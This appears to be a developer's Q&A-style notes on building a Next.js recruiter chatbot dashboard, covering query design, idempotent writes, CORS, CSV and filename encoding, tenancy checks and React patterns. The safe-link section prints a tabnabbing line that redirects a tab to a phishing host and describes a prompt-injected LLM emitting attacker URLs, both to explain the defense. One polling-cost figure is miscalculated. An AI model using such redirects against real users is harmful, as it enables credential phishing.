**Why "LATERAL" matters as a concept**: SQL has two distinct join-like operations. Regular joins compute a Cartesian product and filter; lateral joins evaluate a per-row subquery whose result depends on the outer row. The keyword `LATERAL` is only required in `FROM` clauses (`SELECT … FROM conversations c, LATERAL (SELECT … FROM messages WHERE conversation_id = c.id) m`). In `SELECT` projections, correlated subqueries are lateral by default - Postgres doesn't need the keyword because it can see the outer column reference. Both forms produce the same execution plan; pick whichever reads better.

**The N+1 anti-pattern** is the broader lesson: every time you write `const rows = await db.select(...); for (const row of rows) { const child = await db.select(...) }`, you've built an N+1. The fix is always one of three shapes: a correlated subquery (this case), an in-list batch (`WHERE child.parent_id IN (...)` then dictionary-merge in JS), or a join (`LEFT JOIN` with the relevant aggregate). Pick the one whose result shape matches your output: scalar per row → correlated subquery, list per row → in-list batch, denormalized flat row → join.

> The same `sql` constant is spread into both the SELECT projection (so the rows have the preview) and the WHERE clause (so `?q=` ILIKE filters on it). Doesn't that compute the subquery twice?

It does, and the code reviewer flagged it as tech debt. The reason it's acceptable at slice-6.2 scale: at a few hundred conversations per bot, the subquery is a sub-millisecond scan and running it twice (once for projection, once for ILIKE) is still under 10 ms total. The cleaner shape - extract the preview to a CTE and reference the CTE from both the projection and the count query - would let Postgres compute the subquery exactly once. The tradeoff is one extra layer of SQL nesting in the source file. Defer until any single bot has 10K+ conversations and the dashboard list page starts feeling slow; until then, the duplicated subquery is the cheaper-to-maintain code.

---

### Idempotent Writes Over Server-Side Rate Limiting (Stage 6 Slice 6.2)

> The chat UI's lead-capture flow could double-submit (user double-clicks "Submit", network retry on a slow connection, a misbehaving widget that fires twice). The POST endpoint has no rate limiter yet. How do we prevent two lead rows + two notifications + two bell-badge increments from one user intention?

**Idempotency on the request body** is the right defense, not rate limiting. Rate limiting protects against malicious bursts; idempotency protects against benign double-submits. They solve different problems and both have a place in a mature system, but if you only have time for one, idempotency is the higher-leverage one because it fixes a UX paper cut that real users hit constantly.

The mechanic: derive a deduplication key from the request, look it up before writing, return the existing row if found. For lead capture the key is `(botId, conversationId, lowercased-email)` - same conversation + same recruiter = same lead, no matter how many times the form gets submitted. The lookup is one indexed `findFirst`; the lowercased-email step is critical because users type emails inconsistently (`Jane@x.com` and `jane@x.com` are the same person and must collide on the dedupe key).

The response shape teaches the client what happened: `{ lead, deduped: true }` on a hit, `{ lead, deduped: false }` on a fresh write. The UI can show "Thanks, we've got your email!" on both - the recruiter doesn't need to know whether they double-submitted, but the dashboard analytics know not to count the second submission.

> What about the case where no conversationId is supplied (e.g. the lead came in via a widget that's not the chat path)? The dedupe key collapses to `(botId, email)` and that could match a stale lead from months ago.

The fallback uses a **24-hour rolling window** on `(botId, email)`: only deduplicate against leads captured in the last 24h. A recruiter who came back six months later for a different role is a separate lead; one who double-clicked thirty seconds ago is the same lead. The window is a heuristic - tune it to match how often the same person legitimately re-engages - but the principle generalizes: when the natural dedupe key is missing, fall back to a windowed key over the broader-matching key. The window bounds the false-positive rate without losing the protection against bursts.

> Why is idempotency a HIGHER-leverage defense than rate limiting for this kind of endpoint?

Because the threat models differ. Rate limiting is for adversaries: someone deliberately spamming the endpoint to fill the database or drain owner attention. Idempotency is for benign clients: users with shaky thumbs, networks that retry, frontends that misfire. The user-facing impact of unsolved rate limiting (spam) requires intent; the impact of unsolved idempotency (random doubled notifications) happens by accident, daily, to your most engaged users. Fix the daily papercut first, and let the harder fight wait for Stage 7's Redis layer.

---

### Anonymous Cross-Origin Writes - Layered Defenses Without A Rate Limiter (Stage 6 Slice 6.2)

> The lead capture endpoint accepts JSON from any origin with no auth. With no rate limiter in this stage, what stops an attacker from filling the leads table and the notification feed?

Four layers of defense, each one cheap and each one solving a different threat shape. **Layer 1: small body cap.** The endpoint caps the request body at 4 KB. The largest legitimate payload is well under 2 KB; any larger request is rejected with 413 before the JSON parser even runs. This blocks the "blast the endpoint with multi-megabyte bodies" attack - a thousand requests/second × 4 KB each is bandwidth-bounded at 32 Mbps, not at server CPU. **Layer 2: Zod schema validation.** Email must match a real email regex (Zod's `.email()`), conversationId must be a UUID, contextSummary must be ≤ 1024 chars. Random garbage gets a 400 in microseconds, never touches the database. The hard cap on `contextSummary` prevents the obvious "write a 100 MB description and burn database row size" attack. **Layer 3: bot must be active.** `WHERE bots.id = ? AND is_active = true` - leads to deactivated bots don't write. A bot owner who turns their bot off should not still be receiving leads. **Layer 4: idempotent dedupe with a 24h fallback window.** As discussed above. An adversary cycling unique emails to defeat dedupe still bounds at one transaction per unique email per 24h window per bot. To make that economically painful for the attacker, they'd need to source thousands of legitimate-looking emails - which is itself a deterrent, and would also fail email-deliverability checks any owner reviewing their lead list would notice immediately.

What's left? A determined attacker with infinite emails and patience can still trickle in noise - say, 100 leads per day from 100 unique sender emails. That's the slot Stage 7's Redis rate limiter fills: a per-bot-per-IP token bucket on the POST endpoint. Until then, the layered defenses above push the cost of a meaningful attack high enough that the more lucrative targets are elsewhere on the internet.

**The generalizable lesson**: layered defenses each handle a specific threat shape, and the security posture is the union of what they each cover. Skipping any one layer leaves a particular shape exposed. Rate limiting is one tool; it's not a replacement for body caps, schema validation, business-rule gating, or idempotency. Reach for all of them on any endpoint that accepts anonymous writes.

---

### When To Inline CORS Headers vs. Configure Them In `next.config.js` (Stage 6 Slice 6.2)

> The chat route (Stage 5) lets `next.config.js` inject CORS headers via the `async headers()` config block, but the leads route (Stage 6) handles CORS in-handler via a `jsonWithCors` helper on every response path. Both work - why two different strategies?

The decision pivot is **whether the path serves more than one method with different CORS requirements.** The chat route is single-purpose: POST is public (CORS), OPTIONS preflight returns 204 with the same headers, there is no GET handler. The path's CORS posture is uniform across methods, so `next.config.js`'s path-level header injection is a clean fit - declare once, apply to every method.

The leads route is dual-purpose: POST is public (CORS, called by the widget from `janedoe.com`), GET is owner-gated (same-origin, called by the dashboard at `pro-bot.dev`). The GET response _technically_ doesn't need CORS headers - the dashboard is same-origin, the browser never even checks them. But `next.config.js` would attach them anyway, which is noisy and accidentally documents an intent ("this endpoint is cross-origin") that isn't true for the GET surface. Inline `jsonWithCors` lets the POST surface its CORS posture explicitly and the GET surface stay quiet. Same path, two strategies, no muddled signal.

**A secondary reason to prefer inline**: when the route has multiple error responses (415, 413, 400, 404, 500), each one needs to carry CORS headers - otherwise the browser blocks the response and the widget can't read the error. The `jsonWithCors` helper makes this trivial (every `return jsonWithCors(body, status)` is one line). With `next.config.js`, the headers are attached to every response regardless of status, which is also fine - but you lose the at-a-call-site visibility that the inline helper provides.

**Two strategies coexist; pick by which signal matters more**: declared-once-at-config (for single-purpose CORS paths, terse), or explicit-at-every-response (for mixed paths, self-documenting). Both end at the same wire bytes; the difference is in what future maintainers see when they grep.

---

### RFC 5987 `filename*` For Non-ASCII Downloads (Stage 6 Slice 6.2)

> The CSV export endpoint sets `Content-Disposition: attachment; filename="leads-Jane-Doe-2026-06-19.csv"`. A bot named "Jané Doe" got "leads-Jan-Doe-2026-06-19.csv" - the accent was silently dropped by the ASCII sanitizer. What's the right way to ship the original name to the browser?

The HTTP spec for `Content-Disposition` has two filename parameters that coexist for exactly this reason. **`filename="..."`** is the legacy form: ASCII-only (any non-ASCII goes through implementation-defined behavior, usually replaced or mangled). **`filename*=UTF-8''<percent-encoded>`** is the RFC 5987 form: explicitly UTF-8 encoded, every character preserved. Modern browsers (Chrome, Firefox, Safari, Edge for ~10 years now) prefer `filename*` when both are present; older clients fall back to `filename`. The dual-parameter pattern is the canonical fix:

```
Content-Disposition: attachment; filename="leads-Jane-Doe-2026-06-19.csv"; filename*=UTF-8''leads-Jan%C3%A9%20Doe-2026-06-19.csv
```

The ASCII fallback uses a stripped-and-replaced version of the original (so legacy clients still get a sensible filename); the `filename*` carries the percent-encoded UTF-8 (`Jané` → `Jan%C3%A9`) that Chrome decodes back to `Jané` for the download dialog. **Cost**: ~30 bytes per response header. **Win**: every browser shows the user what they expect to see, including emoji, CJK, Arabic, accented Latin, the lot.

> Why percent-encoding inside the header, instead of just emitting the raw UTF-8 bytes?

HTTP headers are nominally ISO-8859-1 (Latin-1) at the wire level, though most clients accept UTF-8 in `Content-Disposition` body. The percent-encoding in RFC 5987 is a defensive belt: it ensures the header value is plain ASCII printable, so it survives every proxy, every logging layer, every HTTP/1.1-conformant intermediary that might mangle high-bit bytes. The `*` suffix on the parameter name (`filename*` vs `filename`) is the marker that tells the client "this value is RFC-5987-encoded - decode the percent-escapes." Browsers without RFC 5987 support ignore parameters with the `*` suffix entirely, which is why the ASCII fallback `filename="..."` must also be present.

**The general principle**: any time a wire format has both a legacy ASCII slot and a newer Unicode slot for the same field, fill both. The legacy slot keeps old clients working; the new slot is for the actual data. Don't pick one - the cost of both is microscopic and the failure mode of either-alone is real user-visible corruption.

---

### CSV Quoting Beyond CR/LF - The U+2028/U+2029 Edge Case (Stage 6 Slice 6.2)

> The CSV serializer originally quoted any cell containing `,`, `"`, `\r`, or `\n`. The code reviewer flagged that U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) should also trigger quoting. Why? They look like normal whitespace.

CSV is an under-specified format with multiple parser implementations in the wild, and the parsers disagree on what counts as a row terminator. RFC 4180 only requires `\r\n`, but Google Sheets and older Excel versions treat U+2028 and U+2029 as row terminators when they appear in unquoted cells. A recruiter pastes "asked about ML experience was very thorough" into the chat (a copy-paste from a rich-text source that uses U+2028 instead of `\n`), the lead-capture endpoint stores it intact, the CSV export serializes it unquoted, the bot owner opens the file in Google Sheets, and the `context_summary` column silently splits across two rows. The lead's email lands on row N, the context tail lands on row N+1 with no email next to it. Data corruption, no error message, owner doesn't notice until someone asks "why is the export weird?"

The fix is one regex character extension: `[",\r\n]` → `[",\r\n  ]`. Any cell containing those code points now gets wrapped in double quotes, and the quote-respecting parsers (which is all of them) treat the contents as opaque text instead of structured CSV.

> Why does the regex need to be built via `new RegExp(string)` instead of a `/.../` literal?

U+2028 and U+2029 are JavaScript source-level line terminators - the lexer treats them as the end of a line, the same way it treats `\n`. They're allowed inside string literals (since ES2019 relaxed the rule), but they still terminate `//` comments and `/.../` regex literals. Embedding them as raw characters in a regex literal closes the regex mid-pattern with a syntax error. The workaround is to build the regex from a string: `new RegExp("[\",\\r\\n\\u2028\\u2029]")`. The string literal accepts the backslash-u escape sequences, and the RegExp constructor parses them as character class entries. Same wire behavior as a regex literal, source-level immune to the line-terminator problem.

**The wider lesson**: every text format has a long tail of characters that mean something special to _some_ parser, even if not to the spec. CSV's ` `/` ` are one example; HTML's `‮` (RIGHT-TO-LEFT OVERRIDE) is another; URLs have a whole zoo. When in doubt, quote/escape conservatively at the producer end - the cost of a few extra quote characters is microscopic compared to the cost of one corrupted export reaching a user.

---

### The Single-Statement Ownership Check (Stage 6 Slice 6.2)

> The "mark notification as read" endpoint needs to verify two things: the row exists, AND the row belongs to the requesting user. The naïve approach is a SELECT to confirm both, then an UPDATE. Why does the route do it in one statement instead?

The two-statement approach has three problems. **Time-of-check / time-of-use race.** Between the SELECT (which confirms the user owns the row) and the UPDATE (which sets `read_at`), another request could have deleted the row, transferred it, or modified its `user_id`. The window is tiny but real; under load it materializes occasionally and produces "I checked it was mine, then it wasn't" bugs that are hellish to debug. **Round-trip cost.** Two round-trips to Postgres instead of one - small for a single user, real for a polling client that hits the endpoint every 30 seconds. **Existence-leak via timing.** A 404 from "row exists but isn't yours" is timing-distinguishable from a 404 from "row doesn't exist at all" because the SELECT step has different cost in each case. The cross-tenant existence oracle this creates is small but not zero.

The single-statement approach fixes all three: `UPDATE notifications SET read_at = $1 WHERE id = $2 AND user_id = $3 RETURNING id`. The WHERE clause does both the existence check and the ownership check atomically. Postgres takes the row-level lock once; the row either updates (returns 1 row) or doesn't (returns 0 rows). A 0-row result is mapped to 404 - the route can't distinguish "doesn't exist" from "isn't yours," which is the point: a cross-tenant attacker probing for valid notification IDs gets the same response shape and timing regardless of whether they hit a real ID owned by someone else.

> Why is it important to return 404 (not 403) when the row belongs to someone else?

403 (Forbidden) is a confirmation that the resource exists - it just says "you can't have it." 404 (Not Found) gives no information about whether the resource exists. For a notification ID that's UUID-shaped, distinguishing 403 from 404 lets an attacker enumerate which IDs are real even without being able to read their contents. The owner of one of those IDs might be a competitor, an executive, or anyone whose presence in the system is itself sensitive information. Returning 404 in both cases collapses the oracle. **The general rule**: across tenant boundaries, never give different responses for "this resource exists but is not yours" vs "this resource does not exist." The UI for the authenticated owner is the only surface that gets to know which is which.

---

### URL-State Server Rendering For List + Pagination + Search (Stage 6 Slice 6.3)

> The conversations list page needs pagination + a search input. Most React tutorials would build this as a client component with useState for the query, useEffect to fetch when it changes, a loading skeleton, and an array of items rendered after the fetch. The dashboard pages here are server components with one client component (SearchBar) embedded. Why the split?

The architecture distinguishes two state classes. **Shareable, bookmarkable state lives in the URL.** What page am I on? What search query am I filtering by? These are answers the user might want to copy a link to, return to via the back button, or hand to a teammate. **Ephemeral interaction state lives in client React.** What characters are in the input right now? Has the debounce timer fired? Is the dropdown menu open? These are answers nobody outside the current tab needs to know.

For a list page with pagination + search, the URL state pattern looks like: `/dashboard/bots/<id>/conversations?page=3&q=python`. The RSC reads `searchParams.page` and `searchParams.q` at render time, calls the Drizzle query directly, and ships HTML. Pagination is plain `<Link>` elements that navigate to `?page=N`. Search input is a small client component (`<SearchBar>`) whose only job is to debounce keystrokes, then call `router.replace(...)` with the new URL. When the URL changes, Next 14's App Router fetches the updated RSC payload and seamlessly swaps the list - no loading skeleton, no client-side fetch, no double network round-trip. The browser back/forward, share-this-link, and refresh-this-page all just work because the state is in the URL.

**The pivot that makes this pattern shine is `router.replace` over `router.push`.** Replace doesn't push a new history entry - typing "python" letter by letter doesn't add 6 entries to the browser back stack. The last URL before search becomes the "back" target. Push would clog the history with intermediate states the user never explicitly committed to.

**The other pivot is `useTransition`.** The `replace` call is wrapped in `startTransition(() => router.replace(...))` so React doesn't block the input from accepting more keystrokes while the server-rendered list re-fetches. Without this, the typing experience feels sticky on slow networks; with it, the list updates "in the background" while the input stays responsive.

**Why not just fetch from the API endpoint in a `useEffect`?** Three reasons. (1) The RSC has the database connection right there; an extra HTTP round-trip to your own server is pure latency overhead. (2) The server response is already HTML the browser can render directly; fetching JSON means re-running the rendering on the client. (3) Caching - Next.js can deduplicate identical RSC requests and cache the resulting HTML across users in many cases; the API + client-fetch path doesn't get this for free.

> When `?page=` and `?q=` are both in the URL, what happens to one when the other changes?

You need an opinion baked into the URL builder. The default Pagination component preserves `?q=` across page navigation (extraParams prop). The SearchBar resets `?page=` to 1 on every search change - otherwise a search after navigating to page 5 of the unfiltered list lands on page 5 of the filtered results, which is almost always empty. **The pattern**: orthogonal URL params (filters + pagination) interact in non-obvious ways; nail down which changes reset which during the design phase, not after a user complaint.

> The Pagination component drops `?page=` entirely when it's 1. Why?

A canonical URL has no `?page=1` - it has no `page` param at all. Two URLs that point at the same logical page should produce the same browser bar. Dropping the default value keeps the URL shorter, the share-this-link affordance cleaner, and prevents subtle bugs where "go to page 1" and "no page param" need to be treated as identical in route caches, analytics dashboards, and search indexing. **The general rule**: defaults belong out of the URL; only express the non-default state in query params.

---

### The `noopener noreferrer target="_blank"` Triple For User-Generated Hyperlinks (Stage 6 Slice 6.3)

> The dashboard's transcript viewer renders stored chat messages including any hyperlinks the bot replied with. Markdown like `see [docs](https://example.com)` becomes an `<a>` element. Why does the rendered link need three attributes - `target="_blank"`, `rel="noopener"`, and `rel="noreferrer"` - beyond just the URL?

Each attribute defends a distinct exposure surface, and skipping any one re-opens a real vulnerability class. **`target="_blank"`** opens the link in a new tab. That's a UX choice - the dashboard stays loaded so the user can return to their workflow. But it's also where the security problem starts: by default, the newly-opened tab inherits a `window.opener` reference back to the dashboard page, which means JS running in the destination can call `window.opener.location.replace("https://phishing.example.com")` and silently navigate the original dashboard tab to a credential-harvesting clone. The attack is called **tabnabbing** and it's been exploited in the wild against major sites. The user clicks a benign-looking link, switches back to "the dashboard" five minutes later, and the dashboard now looks normal but is actually the attacker's clone asking them to log in again.

**`rel="noopener"`** is the direct defense: it tells the browser to set `window.opener = null` in the destination tab, severing the back-reference. Most modern browsers now imply `noopener` for `target="_blank"` automatically, but only since ~2018 and only when both attributes are present in a specific shape. Setting it explicitly removes the dependency on the browser version. **`rel="noreferrer"`** is the secondary defense: it strips the `Referer` header from the request to the destination, so the destination site doesn't learn which dashboard page (with its sensitive path: `/dashboard/bots/<botId>/conversations/<convId>`) the link was clicked from. This blocks **referer leakage** of internal URLs.

The three-attribute combo is the canonical safe-external-link pattern. Anything less is a vulnerability:

- `target="_blank"` without `rel`: tabnabbing exposure + referer leak.
- `target="_blank" rel="noopener"`: no tabnabbing, but still leaks the internal URL.
- `target="_blank" rel="noreferrer"`: still leaks tabnabbing on older browsers.

For probot specifically, the threat model is sharper than generic web: the bot owner is logged in to the dashboard, and the stored transcript text is generated by an LLM (which can hallucinate or be prompt-injected into producing arbitrary URLs). A transcript saying "go to https://anthropic.com" might silently render as an `<a href="https://attacker.com">` if the upstream LLM was prompt-injected. The three attributes don't fix the injection - they ensure that even when the injection succeeds, the worst outcome is the user visiting an attacker page in a fresh tab, not their dashboard session getting hijacked.

> The chat MessageBubble has the same SafeLink. Why is the same defense duplicated in the dashboard's TranscriptMessage?

Because the threat is the same: stored text that's rendered as HTML must escape, and any `<a>` it produces must be tab-isolated. The defense isn't "applied to the chat" - it's applied to **every render of user-or-LLM-generated text as HTML**. The dashboard transcript is a second render of the same text, six weeks later, by a different user (the bot owner instead of the recruiter), but the rendering surface is identical. Defense must live at every render site, not at the source - because there's no guarantee that the rendering pipeline scrubs links the same way at every endpoint.

---

### Shared Query Modules - The Caller-Contract Pattern For Tenancy (Stage 6 Slice 6.3)

> When the API routes and the RSC pages need the same database query, the obvious move is to extract it to a shared module. But which side does the tenant check - the shared module or the caller?

Two strategies, real tradeoff. **Option A: Shared module takes `userId` and does the check.** The query becomes `WHERE bot_id = ? AND bot.user_id = ?`, so every caller passes both. Safer by default - a new call site can't accidentally skip the ownership check because the function signature forces them to provide it. But the shape couples the query layer to the auth session, and every call site needs to thread `userId` through whatever helpers they're using.

**Option B: Shared module takes `botId` only and trusts the caller.** The function is just `WHERE bot_id = ?`, and every caller is expected to have verified ownership upstream (in the route, that's `requireBotOwner`; in the RSC page, that's the `findFirst({ where: and(eq(bots.id), eq(bots.userId, ...)) })` pattern). Simpler call sites, more flexibility - but a new caller could forget the upstream guard and silently leak across tenants.

The slice ships Option B with a module-level doc comment that makes the contract explicit. Three reasons. (1) The upstream-check pattern was already established by Stage 5's bot detail page; adopting it everywhere keeps the dashboard codebase consistent. (2) The doc comment is grep-friendly - searching for `listLeads` or `listConversations` immediately shows the contract before any code is written that uses it. (3) The cost of Option A is small per-callsite, but Option B's flexibility pays off when a future internal background job (e.g. a cron that aggregates leads across all bots, regardless of owner) needs the same query - Option A would require an awkward fake `userId` to satisfy the contract.

**The generalizable lesson is "make implicit contracts visible."** If a function has a precondition that callers must enforce - tenancy, sanitization, rate-limit ack, whatever - the worst place to encode the precondition is "in the comments at the call site." The next-worst is "in the developer's head." The best is the function signature (which forces compile-time checks) or, when that's impractical, a doc comment at the module level (which the next contributor reads when they import the function). Skipping the comment is technical debt that compounds: every new caller that gets the precondition right by accident is one more example to lean on when reviewing the next caller, until eventually someone gets it wrong and the bug is invisible because everyone else "knew" the pattern.

> When does the "trust the caller" pattern get dangerous?

When the caller's responsibility includes a check that _can fail silently_. Tenancy checks are loud - they `notFound()` or return 401 - so a forgotten check makes the API obviously broken. Compare with rate-limit checks: if the shared function trusts the caller has rate-limited, and a new caller forgets, no test or user-visible behavior necessarily reveals the gap; the abuse only surfaces in production as elevated DB load. For checks that can be skipped without immediate symptoms, push them into the function signature so they're impossible to skip. For checks with loud failure modes, the doc-comment-contract pattern is fine.

---

### Lazy `useState` Initializer vs. Render-Body `useRef` Writes (Stage 6 Slice 6.4)

> ChatWindow needs to compute a per-tab sessionId exactly once at mount and never recompute it. The first draft used `const ref = useRef(null); if (ref.current === null) ref.current = expensiveCompute()`. A reviewer flagged this as a React anti-pattern. What's the right way?

There are two patterns that look like they do the same thing - write a value once at mount, read it on every subsequent render - but they have different correctness properties under React's runtime guarantees. **Pattern A: write to a `useRef` inside the render body** (the rejected draft). **Pattern B: lazy `useState` initializer** (the canonical fix): `const [value] = useState(() => expensiveCompute())`.

Both produce a stable value across renders. The difference is in how they behave under React Strict Mode - and more generally, what React promises about render functions. **Strict Mode intentionally double-invokes the render function in development** to flush out side effects that don't survive re-renders. With pattern A, the first invocation writes the ref, the second invocation sees the ref already set and skips the compute - _the value is fine_, but the side effects inside `expensiveCompute()` ran on the first pass and were never cleaned up. If those side effects write to sessionStorage, set up a connection, or push to an analytics queue, you get a duplicate that the cleanup function (which only `useEffect` has) cannot undo. With pattern B, React contract-guarantees the initializer runs exactly once per component instance even under Strict Mode - by design, that's what the lazy-initializer form is for.

The broader principle: **`useRef` is for values that persist across renders without triggering re-renders** (DOM nodes, mutable counters, debounce timers). It is not designed as a "compute once" container, and React's render-rules don't protect side effects placed in its initialization path. `useState`'s lazy initializer is the contract-guaranteed "compute once at mount" mechanism. When you find yourself reaching for `useRef` to memoize an expensive compute, you almost always want `useState(() => compute())` instead - and if the value really shouldn't trigger re-renders (which would be exotic for a mount-stable value, since it never changes), the lazy initializer still works because state that's never updated never triggers a re-render.

> Why doesn't `useMemo` work here?

It would _almost_ work. `useMemo(() => compute(), [])` runs the compute on the first render and caches the result. But React explicitly reserves the right to drop the cache and recompute on subsequent renders - for memory pressure reasons, for example. The docs say "you may rely on useMemo as a performance optimization, not as a semantic guarantee." If `compute()` has a side effect or returns a fresh identity each call, a dropped cache is a bug. The lazy `useState` initializer has a stronger contract: the value is held in state and persists for the lifetime of the component instance, period. For "compute once and reuse forever," reach for `useState(() => ...)`.

---

### Exhaustiveness Checks With `never` In Discriminated Union Dispatches (Stage 6 Slice 6.4)

> The ChatWindow render loop dispatches on `m.role`. Today there's one system variant (`kind: "lead_capture"`). The first draft checked only `m.role === "system"` and routed all system messages to the lead-capture card. The reviewer flagged this as not future-proof - what's the canonical fix?

The pattern is called an **exhaustiveness check** and it uses TypeScript's `never` type to convert a future-runtime bug into a present-compile-time error. The shape:

```ts
if (m.role === "system") {
  if (m.kind === "lead_capture") return <LeadCaptureCard ... />;
  // Anything else with role === "system" lands here.
  const _exhaustive: never = m.kind;
  void _exhaustive;
  return null;
}
```

Today `m.kind` (after the `role === "system"` narrow) is the union `"lead_capture"`. After the `m.kind === "lead_capture"` check, the type system narrows `m.kind` to `never` in the unreachable branch. Assigning `m.kind` to a variable of type `never` typechecks fine because `never` is the bottom type. Now imagine a future variant: `{ role: "system"; kind: "cookie_banner" }`. After the type extension, `m.kind` in the unreachable branch becomes `"cookie_banner"` - and `const _exhaustive: never = "cookie_banner"` is a compile error. The next person to add a system variant has to update this dispatch to handle it; they cannot accidentally ship a binary that silently misroutes the new variant to `<LeadCaptureCard>`.

**This is the canonical pattern for guarding discriminated-union dispatches against future extension.** Use it anywhere you're switching on a `kind`, `type`, `role`, `status`, or any other discriminant. The cost is two lines per dispatch site; the benefit is that adding a new variant turns into a compiler-driven punch list of every place that needs to handle it.

> `void _exhaustive` looks weird. Why not just `const _: never = m.kind`?

Both work. The `void` operator on the unused variable suppresses TypeScript's "unused variable" warning (or your linter's noUnusedLocals rule) without changing semantics. Some projects configure their linters to allow underscore-prefixed unused variables and drop the `void`. Either style preserves the type-check guarantee; pick whichever your codebase's lint config is happiest with.

> Could I use a `switch` statement with a `default: never` instead?

Yes, and for dispatches with three or more branches the switch form is usually cleaner:

```ts
switch (m.kind) {
  case "lead_capture": return <LeadCaptureCard ... />;
  case "cookie_banner": return <CookieBanner ... />;
  default: {
    const _: never = m.kind;
    return null;
  }
}
```

The shape is the same - the unreachable branch asserts `never` on the discriminant - and TypeScript will fail to typecheck the `default` if a new case is added without a matching `case`. For two-branch dispatches, the `if`/`else` form is shorter; for more, the switch wins on readability.

---

### Page Visibility API For Polling - Free Battery, Free Server Cost (Stage 6 Slice 6.4)

> The notification bell polls `/api/notifications/unread-count` every 30 seconds while the dashboard is open. If the user opens the dashboard at 9 a.m. and leaves the tab in the background all day, that's 28,800 polls a day (60s / 30s × 60min × 8hr × 1 tab) on a query they're not even looking at. How do we stop?

The Web Platform exposes a `visibilitychange` event on `document` and a `document.visibilityState` property that flips between `"visible"` and `"hidden"` (and rarely `"prerender"`). The bell's polling loop ties its start/stop to this:

```ts
useEffect(() => {
  let intervalId: ReturnType<typeof setInterval> | null = null;
  function start() {
    if (intervalId !== null) return;
    void refresh();
    intervalId = setInterval(() => void refresh(), 30_000);
  }
  function stop() {
    if (intervalId !== null) {
      clearInterval(intervalId);
      intervalId = null;
    }
  }
  function handleVisibility() {
    document.visibilityState === "visible" ? start() : stop();
  }
  if (document.visibilityState === "visible") start();
  document.addEventListener("visibilitychange", handleVisibility);
  return () => {
    stop();
    document.removeEventListener("visibilitychange", handleVisibility);
  };
}, [refresh]);
```

The result: while the tab is visible, polling runs at the configured cadence. When the user switches tabs, alt-tabs to another app, locks their laptop, or minimizes the browser, the interval is cleared. When they come back, the visibility event fires, `start()` runs, and an immediate `refresh()` brings the badge current before the next 30s tick. **The user sees no behavioral difference** - the bell updates the moment they return to the dashboard - **but the server stops receiving polls during the idle period**.

> Why fire an immediate refresh on visibility-back, instead of waiting for the next 30s tick?

Because the badge is stale by exactly however long the tab was hidden. If a user is gone for 15 minutes, the next interval tick is up to 30 seconds away. Firing `refresh()` immediately on visibility-back closes that gap to one network round-trip - the badge is current within ~200ms of the user looking at it again. The cost is one extra request per visibility transition, which is negligible compared to the polls you saved while hidden.

> What about Battery Status API? Or `navigator.connection.saveData`?

Visibility is the highest-signal lever - most "tab in background" idle is observed via this signal alone. Battery and saveData are smaller wins and worth layering only if you have evidence they help. Per CLAUDE.md §2 (KISS), ship visibility-based pause first; revisit only if poll cost becomes a measured problem. **The general principle: polling cadence should always be conditional on whether the user is actually looking.** This applies beyond browser tabs: a mobile app's polling pauses when the app goes to background; a desktop client's polling pauses when the window is occluded or minimized; a CLI tool that polls a server pauses when stdin is detached. The user-not-looking signal varies by platform; the answer is always "stop spending resources nobody's consuming."

> The polling refresh function swallows errors silently - is that right?

For a polling loop where the next iteration will retry, yes. A single failed poll due to a transient network glitch shouldn't reset the badge to a stale zero, shouldn't pop a toast, shouldn't trigger a retry storm. The next successful poll will reconcile. **The general rule for idempotent polling loops: log on failure, don't surface it; let the next iteration heal.** Pop-up errors are for user-initiated actions where the user is waiting for a result. Background polls are silent successes and silent failures with eventual consistency.

---

### Widening A Mass-Assignment Whitelist Without Reintroducing The Vulnerability (Stage 6 Slice 6.5)

> Slice 5 shipped a PATCH endpoint that accepted only `themeColor`. Slice 6.5 widens it to 5 fields (name, headline, personality, suggestedQuestions, themeColor). How do you widen the surface without losing the mass-assignment defense?

Two patterns. **The wrong one: write a "stripped body" function that deletes fields you don't want.** That's a denylist - and denylists are a maintenance trap. Tomorrow someone adds a new column to the `bots` table - `customDomain`, say. The PATCH handler's `delete body.userId; delete body.isActive; delete body.contextText` block silently doesn't know about it. Now `customDomain` is mass-assignable. The pattern fails open at every schema migration.

**The right one: schema as whitelist, route as schema-consumer.** The Zod object defines exactly the fields the endpoint accepts. Anything not in the schema is dropped by `safeParse` - not "silently dropped," but "never touches the SET payload because the route only reads `parsed.data.X` for X in the schema." Adding a new editable field is a two-place edit: add it to the schema, add the conditional assignment in the route. Missing either step means the field doesn't update - a loud failure mode. Forgetting to add a NEW column (the dangerous case from above) means the schema doesn't list it, so it's not assignable. The system fails closed.

Concretely:

```ts
// schema.ts
export const botPatchInput = z
  .object({
    name: z.string().trim().min(1).max(100).optional(),
    headline: z
      .string()
      .transform((v) => v.trim())
      .max(120)
      .optional(),
    personality: z.enum(PERSONALITY_PRESETS).optional(),
    suggestedQuestions: z.array(z.string().max(200)).max(6).optional(),
    themeColor: themeColorSchema.optional(),
  })
  .refine(
    (v) => Object.values(v).some((x) => x !== undefined),
    "PATCH body must include at least one field",
  );

// route.ts
const parsed = botPatchInput.safeParse(body);
if (!parsed.success) return 400;
const { themeColor, name, headline, personality, suggestedQuestions } =
  parsed.data;
const set: Record<string, unknown> = {};
if (themeColor !== undefined) set.themeColor = themeColor;
if (name !== undefined) set.name = name;
if (headline !== undefined) set.headline = headline;
if (personality !== undefined) set.personality = personality;
if (suggestedQuestions !== undefined)
  set.suggestedQuestions = suggestedQuestions;
// Note: the destructured variable names ARE the whitelist. There's no
// way to land userId, isActive, contextText in `set` without explicitly
// adding them to the destructure AND a conditional assignment.
```

The shape is grep-friendly: searching for `set.<columnName>` shows you every field that can be PATCHed. Searching for "patchInput" or "Patch" lists every schema that defines a write surface. A future audit asking "can a user PATCH their own `userId`?" gets a binary answer from the schema definition. With the denylist pattern, the answer is "trace control flow and hope you didn't miss a code path."

> Why server-side `.trim()` on `headline` instead of client-side?

Defense at the boundary nearest the data store. Client-side trim works for honest clients but is bypassable - a hostile actor crafts the request directly without going through the React form. Server-side trim guarantees the DB never holds `"   "` regardless of what the client did. The same principle applies to email lowercasing for dedupe keys, username normalization, URL canonicalization. **Trust the request, but enforce invariants on the way in.**

> Should the schema reject `headline: ""` outright?

Empty string is the canonical "no headline" value - the way the UI signals "clear this field." Rejecting `""` would force the client to send something like `null` or omit the field entirely, both of which are weird semantics for an editable text field. The trim transform converts whitespace-only padding to empty, the column allows empty, and the widget renders no headline section when the value is empty. Three consistent layers without forcing the client to know special sentinel values.

---

### `onClick` vs `onMouseDown` For Modal Backdrop Dismissal (Stage 6 Slice 6.5)

